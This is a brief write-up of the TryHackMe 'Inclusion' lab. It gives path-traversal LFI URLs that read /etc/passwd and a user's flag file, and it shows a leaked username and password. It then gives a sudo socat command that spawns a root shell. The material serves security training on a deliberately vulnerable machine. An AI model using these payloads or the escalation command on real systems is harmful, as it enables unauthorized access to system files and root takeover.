### LFI Inclusion TryHackMe

## Nmap scans

`Open ports:
22                                                                                                                                                                 
80			## LFI attack
`

## Information collection
http://machineip/article?name=../../../../../../../../../../etc/passwd

We see a user named falconfeast. And we also have his password: 

___falconfeast: rootpassword___


##User Flag and Getting a shell
Now we can get the user flag using LFI like this:
http://machineip/article?name=../../../../../../../../../../home/falconfeast/user.txt

OR 

We can login to the machine which we will have to do it anyway.

## Priv-esc

We get the first flag from this.

now running `sudo -l` --> we see we can run /usr/bin/socat as root

So we go to gtfobins for sudo command to directly get root access.

sudo /usr/bin/socat stdin exec:/bin/bash

Now we can get the root flag.
